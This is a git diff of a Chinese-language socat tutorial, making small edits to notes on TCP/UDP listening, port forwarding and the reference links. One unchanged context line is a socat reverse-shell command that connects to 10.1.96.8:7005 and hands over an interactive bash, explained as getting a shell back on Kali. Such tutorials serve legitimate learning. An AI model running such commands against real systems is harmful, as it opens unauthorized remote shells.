@@ -23,6 +23,10 @@ address 可以是以下的数据源：
 4、TCP-LISTEN: 建立 一个 TCP 监听端口，TCP 也可以替换为 UDP。
 5、EXEC: 执行一个程序作为数据流。
 ```
+btw：
+```text
+TCP 和 UDP 的区别就是 TCP-LISTEN 和 UDP-LISTEN，换个名字即可
+```
 
 # 3、文件操作
 ## 3.1、读文件
@@ -77,10 +81,6 @@ nc 127.0.0.1 8888
 ```
 
 ## 4.3、转发
-写在前面：
-```text
-TCP 和 UDP的区别就是 TCP-LISTEN 和 UDP-LISTEN，换个名字即可
-```
 转发，直接上 demo：
 ```text
 socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:8888,bind=127.0.0.1,reuseaddr,fork TCP4:127.0.0.1:9999
@@ -95,7 +95,7 @@ TCP4:127.0.0.1:9999  转到这个端口上
 ```
 
 ### 4.3.1、转发实操
-开一个 TCP 端口，9999：
+开一个 TCP 监听端口，9999：
 ```text
 nc -l 9999
 ```
@@ -222,6 +222,6 @@ socat tcp-connect:10.1.96.8:7005 exec:'bash -li',pty,stderr,setsid,sigint,sane
 说实话，反弹的意思是，让 target 来反向给我们 kali 的 shell，这个名字起得真好。
 ```
 
-# 参考链接
-*[What actually reuseaddr option does in socat?](https://stackoverflow.com/questions/75059280/what-actually-reuseaddr-option-does-in-socat)
-*[奇妙的linux世界：Socat 入门教程](https://mp.weixin.qq.com/s/96GQcFN_Avjfu1zvJDVEyg)
+# 7、参考链接
+* [What actually reuseaddr option does in socat?](https://stackoverflow.com/questions/75059280/what-actually-reuseaddr-option-does-in-socat)
+* [奇妙的linux世界：Socat 入门教程](https://mp.weixin.qq.com/s/96GQcFN_Avjfu1zvJDVEyg)
